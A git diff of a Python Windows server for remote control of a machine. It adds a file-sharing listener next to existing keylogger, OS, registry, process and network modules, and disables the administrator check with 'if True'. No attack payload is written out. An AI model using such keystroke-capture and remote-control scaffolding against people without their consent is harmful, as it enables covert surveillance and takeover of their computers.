@@ -7,9 +7,11 @@ from Process import Process
 from Application import Application
 from Network import Network
 from SysTrayIcon import SysTrayIcon
+from ShareFile import ShareFile
 from ctypes import windll
 
-import itertools, glob
+import itertools
+import glob
 import sys
 import socket
 import os
@@ -21,7 +23,7 @@ ADDR = (HOST, PORT)
 
 class ServerApp:
     def __init__(self):
-        if self.is_admin():
+        if True:  # self.is_admin():
             self.setup()
 
         else:
@@ -60,16 +62,18 @@ class ServerApp:
         self.process = Process(self.server)
         self.application = Application(self.server)
         self.network = Network(self.server)
+        self.share_file = ShareFile(self.server)
 
         self.start_listening(sysTrayIcon)
 
     def start_listening(self, sysTrayIcon):
         try:
             addr = self.server.accept()
-            sysTrayIcon.hover_text = "Connected by " + addr[0]
+            sysTrayIcon.hover_text = "Connected by " + addr
             sysTrayIcon.refresh_icon()
 
             listeners = [
+                self.share_file.start_listening,  # DONE
                 self.key_logger.start_listening,  # DONE
                 self.os.start_listening,  # DONE
                 self.registry.start_listening,  # DONE
@@ -81,9 +85,9 @@ class ServerApp:
 
             while True:
                 print("MENU:")
-                s = self.server.receive_signal()
-                print(s)
+                s = self.server.receive_obj()
 
+                print(s)
                 if s == "QUIT":
                     break
 
@@ -96,7 +100,7 @@ class ServerApp:
             self.key_logger.stop()
             self.start_listening(sysTrayIcon)
 
-        except:
+        except Exception as e:
             self.quit(sysTrayIcon)
 
     def quit(self, SysTrayIcon):
